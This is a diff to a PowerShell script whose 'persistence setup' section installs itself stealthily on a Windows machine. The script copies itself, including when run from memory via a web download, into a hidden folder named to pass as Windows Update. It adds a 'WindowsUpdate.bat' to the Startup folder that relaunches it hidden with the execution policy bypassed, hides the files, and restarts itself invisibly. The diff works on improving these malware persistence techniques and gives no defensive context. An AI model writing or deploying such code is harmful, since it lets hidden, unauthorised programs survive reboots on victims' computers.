@@ -10,11 +10,13 @@ if ((Get-ExecutionPolicy -Scope Process) -ne 'Bypass') {
 
 # First section - persistence setup
 try {
-    # Use user's AppData folder and construct full paths
-    $persistPath = Join-Path $env:LOCALAPPDATA "Microsoft"
-    $persistPath = Join-Path $persistPath "Windows"
-    $persistPath = Join-Path $persistPath "WindowsUpdate"
+    # Create temp script with current content
+    $scriptContent = @'
+    # Script content will be replaced here
+'@
     
+    # Use user's AppData folder and construct full paths
+    $persistPath = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\WindowsUpdate"
     $scriptPath = Join-Path $persistPath "services.ps1"
     $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
     $batPath = Join-Path $startupPath "WindowsUpdate.bat"
@@ -24,17 +26,19 @@ try {
         New-Item -ItemType Directory -Path $persistPath -Force -ErrorAction Stop | Out-Null
     }
 
-    # Ensure script path directory exists
-    $scriptDir = Split-Path $scriptPath -Parent
-    if (-not (Test-Path $scriptDir)) {
-        New-Item -ItemType Directory -Path $scriptDir -Force -ErrorAction Stop | Out-Null
-    }
-
-    # Copy script with full path validation
-    if (Test-Path $MyInvocation.MyCommand.Path) {
-        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force -ErrorAction Stop
-    } else {
-        throw "Source script path not found"
+    # Create or update script file
+    if (-not (Test-Path $scriptPath) -or -not (Get-Content $scriptPath -Raw)) {
+        # For IRM execution, use current script content
+        if ($MyInvocation.MyCommand.Path) {
+            Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
+        } else {
+            # For IRM, get script content from memory
+            $currentScript = $scriptContent
+            if (-not $currentScript) {
+                $currentScript = $MyInvocation.MyCommand.ScriptBlock.ToString()
+            }
+            Set-Content -Path $scriptPath -Value $currentScript -Force
+        }
     }
 
     # Create batch file with error handling
@@ -43,10 +47,6 @@ try {
 PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath" 
 exit
 "@
-    $batDir = Split-Path $batPath -Parent
-    if (-not (Test-Path $batDir)) {
-        New-Item -ItemType Directory -Path $batDir -Force -ErrorAction Stop | Out-Null
-    }
     [System.IO.File]::WriteAllText($batPath, $batContent)
 
     # Hide files with validation
@@ -55,10 +55,11 @@ exit
     if (Test-Path $persistPath) { (Get-Item $persistPath -Force).Attributes = 'Hidden' }
 
     # Start hidden if not already running from persist location
-    if (-not $MyInvocation.MyCommand.Path.Contains("services.ps1")) {
+    if (-not $MyInvocation.MyCommand.Path -or -not $MyInvocation.MyCommand.Path.Contains("services.ps1")) {
         Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
         exit
     }
+
 } catch {
     Write-Warning "Persistence setup failed: $_"
 }
